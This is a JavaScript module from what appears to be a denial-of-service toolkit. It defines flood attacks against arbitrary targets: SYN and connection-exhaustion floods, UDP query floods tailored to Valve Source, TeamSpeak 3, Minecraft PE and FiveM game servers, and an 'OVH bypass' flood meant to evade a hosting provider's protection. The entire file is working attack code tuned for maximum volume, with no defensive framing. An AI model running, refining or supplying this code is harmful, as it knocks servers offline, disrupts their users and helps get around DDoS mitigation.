import net from 'net';
import dgram from 'dgram';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';

/**
 * SYN Flood Attack - MAXIMIZED VERSION
 */
export class SYNFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            // 20 simultaneous SYN flood waves
            const waves = [];
            for (let i = 0; i < 20; i++) {
                waves.push(this.attack());
            }
            await Promise.allSettled(waves);
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const connections = [];
            
            // Create 500 SYN connections per wave
            for (let i = 0; i < 500; i++) {
                if (!this.active) break;
                
                const socket = new net.Socket();
                socket.setTimeout(100);
                socket.setNoDelay(true);

                socket.connect(this.port, this.target, () => {
                    // Don't complete handshake - leave in SYN_SENT state
                    REQUESTS_SENT.add(1);
                    // Don't send any data to keep connection half-open
                });

                socket.on('error', () => {
                    Tools.safeClose(socket);
                });

                socket.on('timeout', () => {
                    Tools.safeClose(socket);
                });

                connections.push(socket);
            }

            setTimeout(() => {
                connections.forEach(socket => Tools.safeClose(socket));
                resolve();
            }, 50);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * VSE (Valve Source Engine) Query Flood
 */
export class VSEFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = dgram.createSocket('udp4');
            
            // VSE Query packet format
            // \xFF\xFF\xFF\xFFTSource Engine Query\x00
            const payload = Buffer.from([
                0xFF, 0xFF, 0xFF, 0xFF, 0x54, 
                ...Buffer.from('Source Engine Query\x00')
            ]);

            const sendPackets = () => {
                if (!this.active) {
                    Tools.safeClose(socket);
                    resolve();
                    return;
                }

                for (let i = 0; i < 100; i++) {
                    Tools.sendTo(socket, payload, this.port, this.target);
                    REQUESTS_SENT.add(1);
                    BYTES_SENT.add(payload.length);
                }

                setTimeout(() => {
                    Tools.safeClose(socket);
                    resolve();
                }, 100);
            };

            sendPackets();
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * TeamSpeak 3 Attack
 */
export class TS3Flood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port || 9987; // Default TS3 port
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = dgram.createSocket('udp4');
            
            // TS3 query packet
            const payload = Buffer.from([
                0x05, 0xca, 0x7f, 0x16, 0x9c, 0x11, 0xf9, 0x89,
                0x00, 0x00, 0x00, 0x00, 0x02,
                ...Buffer.from('TeamSpeak')
            ]);

            const sendPackets = () => {
                if (!this.active) {
                    Tools.safeClose(socket);
                    resolve();
                    return;
                }

                for (let i = 0; i < 100; i++) {
                    Tools.sendTo(socket, payload, this.port, this.target);
                    REQUESTS_SENT.add(1);
                    BYTES_SENT.add(payload.length);
                }

                setTimeout(() => {
                    Tools.safeClose(socket);
                    resolve();
                }, 100);
            };

            sendPackets();
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * Minecraft Pocket Edition (MCPE) Attack - IMPROVED AGGRESSIVE VERSION
 */
export class MCPEFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port || 19132; // Default MCPE port
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            // Launch multiple attack instances simultaneously
            const attacks = [];
            for (let i = 0; i < 20; i++) {
                attacks.push(this.attack());
            }
            await Promise.allSettled(attacks);
        }
    }

    generateRakNetPackets() {
        const packets = [];
        
        // Unconnected Ping
        packets.push(Buffer.from([
            0x01,
            ...Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
            0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78,
            ...Tools.randomBytesBuffer(8)
        ]));

        // Open Connection Request 1
        packets.push(Buffer.from([
            0x05,
            0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
            0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78,
            0x0b, // Protocol version
            ...Tools.randomBytesBuffer(1464) // MTU padding
        ]));

        // Open Connection Request 2
        packets.push(Buffer.from([
            0x07,
            0x00, 0xff, 0xff, 0x00, 0xfe, 0xfe, 0xfe, 0xfe,
            0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78,
            ...Tools.randomBytesBuffer(20), // Server address
            0x04, 0x3a, // MTU
            ...Tools.randomBytesBuffer(8) // Client GUID
        ]));

        // Malformed packets to stress server
        for (let i = 0; i < 5; i++) {
            packets.push(Buffer.from([
                Tools.randomInt(0x00, 0xff),
                ...Tools.randomBytesBuffer(Tools.randomInt(100, 1500))
            ]));
        }

        return packets;
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = dgram.createSocket('udp4');
            const packets = this.generateRakNetPackets();
            
            let packetsSent = 0;
            const maxPackets = 5000; // Send way more packets

            const sendPackets = () => {
                if (!this.active || packetsSent >= maxPackets) {
                    Tools.safeClose(socket);
                    resolve();
                    return;
                }

                // Send all packet types rapidly
                for (let i = 0; i < 500; i++) {
                    if (!this.active) break;
                    
                    // Cycle through different packet types
                    const packet = packets[i % packets.length];
                    Tools.sendTo(socket, packet, this.port, this.target);
                    REQUESTS_SENT.add(1);
                    BYTES_SENT.add(packet.length);
                    packetsSent++;
                }

                // Continue sending immediately
                setImmediate(sendPackets);
            };

            sendPackets();

            // Auto-close after 2 seconds
            setTimeout(() => {
                Tools.safeClose(socket);
                resolve();
            }, 2000);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * FiveM Server Attack
 */
export class FiveMFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port || 30120; // Default FiveM port
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = dgram.createSocket('udp4');
            
            // FiveM getinfo packet
            const payload = Buffer.from([
                0xff, 0xff, 0xff, 0xff,
                ...Buffer.from('getinfo xxx')
            ]);

            const sendPackets = () => {
                if (!this.active) {
                    Tools.safeClose(socket);
                    resolve();
                    return;
                }

                for (let i = 0; i < 100; i++) {
                    Tools.sendTo(socket, payload, this.port, this.target);
                    REQUESTS_SENT.add(1);
                    BYTES_SENT.add(payload.length);
                }

                setTimeout(() => {
                    Tools.safeClose(socket);
                    resolve();
                }, 100);
            };

            sendPackets();
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * FiveM with Token Attack (Bypass)
 */
export class FiveMTokenFlood extends FiveMFlood {
    async attack() {
        return new Promise((resolve) => {
            const socket = dgram.createSocket('udp4');
            
            // FiveM with token
            const token = Tools.randomString(32);
            const payload = Buffer.from([
                0xff, 0xff, 0xff, 0xff,
                ...Buffer.from(`getinfo ${token}`)
            ]);

            const sendPackets = () => {
                if (!this.active) {
                    Tools.safeClose(socket);
                    resolve();
                    return;
                }

                for (let i = 0; i < 100; i++) {
                    Tools.sendTo(socket, payload, this.port, this.target);
                    REQUESTS_SENT.add(1);
                    BYTES_SENT.add(payload.length);
                }

                setTimeout(() => {
                    Tools.safeClose(socket);
                    resolve();
                }, 100);
            };

            sendPackets();
        });
    }
}

/**
 * Connection Per Second (CPS) Attack
 */
export class CPSFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const connections = [];
            
            // Create many connections quickly
            for (let i = 0; i < 100; i++) {
                if (!this.active) break;
                
                const socket = new net.Socket();
                socket.setTimeout(300);

                socket.connect(this.port, this.target, () => {
                    REQUESTS_SENT.add(1);
                    // Close immediately after connect
                    Tools.safeClose(socket);
                });

                socket.on('error', () => {
                    Tools.safeClose(socket);
                });

                socket.on('timeout', () => {
                    Tools.safeClose(socket);
                });

                connections.push(socket);
            }

            setTimeout(() => {
                connections.forEach(socket => Tools.safeClose(socket));
                resolve();
            }, 50);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * Connection Flood Attack
 */
export class ConnectionFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
        this.connections = [];
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }

        // Cleanup
        this.connections.forEach(socket => Tools.safeClose(socket));
    }

    async attack() {
        return new Promise((resolve) => {
            // Keep connections open
            for (let i = 0; i < 50; i++) {
                if (!this.active) break;
                
                const socket = new net.Socket();
                socket.setTimeout(5000);

                socket.connect(this.port, this.target, () => {
                    REQUESTS_SENT.add(1);
                    // Keep alive, don't close
                });

                socket.on('error', () => {
                    const index = this.connections.indexOf(socket);
                    if (index > -1) {
                        this.connections.splice(index, 1);
                    }
                    Tools.safeClose(socket);
                });

                socket.on('timeout', () => {
                    const index = this.connections.indexOf(socket);
                    if (index > -1) {
                        this.connections.splice(index, 1);
                    }
                    Tools.safeClose(socket);
                });

                this.connections.push(socket);
            }

            setTimeout(resolve, 100);
        });
    }

    stop() {
        this.active = false;
        this.connections.forEach(socket => Tools.safeClose(socket));
        this.connections = [];
    }
}

/**
 * OVH UDP Bypass Attack
 */
export class OVHUDPFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = dgram.createSocket('udp4');
            
            // Large payload with fragmentation to bypass OVH
            const payload = Tools.randomBytesBuffer(1400); // Near MTU size

            const sendPackets = () => {
                if (!this.active) {
                    Tools.safeClose(socket);
                    resolve();
                    return;
                }

                for (let i = 0; i < 200; i++) {
                    Tools.sendTo(socket, payload, this.port, this.target);
                    REQUESTS_SENT.add(1);
                    BYTES_SENT.add(payload.length);
                }

                setTimeout(() => {
                    Tools.safeClose(socket);
                    resolve();
                }, 50);
            };

            sendPackets();
        });
    }

    stop() {
        this.active = false;
    }
}
